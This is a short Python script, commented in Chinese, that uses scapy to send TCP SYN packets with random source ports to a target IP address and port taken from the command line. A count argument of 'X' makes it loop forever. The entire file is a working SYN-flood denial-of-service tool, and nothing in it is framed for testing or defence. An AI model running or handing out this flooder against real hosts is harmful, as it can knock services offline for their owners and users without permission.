import sys
from scapy.all import *
from scapy.layers.inet import *
import argparse
import os

# 校验是否以root用户运行该程序
if os.getuid() != 0:
    print('You need to run this program as root')
    sys.exit(1)

# 为命令行执行创建参数
arums = argparse.ArgumentParser(description="The arguments used to send SYN request to target")
arums.add_argument('-d', help="The destination IP address of SYN request")
arums.add_argument('-c', help="The amount of SYN request to send")
arums.add_argument('-p', help="The destination port of SYN request")
arums = arums.parse_args()

# 判断命令行中是否输入了参数
if len(sys.argv) == 1:
    arums.print_help()
    sys.exit(1)

num = 0 # 记录发包次数

# 通过scapy发送SYN包
def creatPack():
    global num
    pack = IP(dst=arums.d) / TCP(flags='S', sport=RandShort(), dport=int(arums.p))
    send(pack, verbose=0)
    num += 1

# 循环发包
if arums.c == "X" or arums.c == "x":
    while True:
        creatPack()
else:
    while num < int(arums.c):
        creatPack()
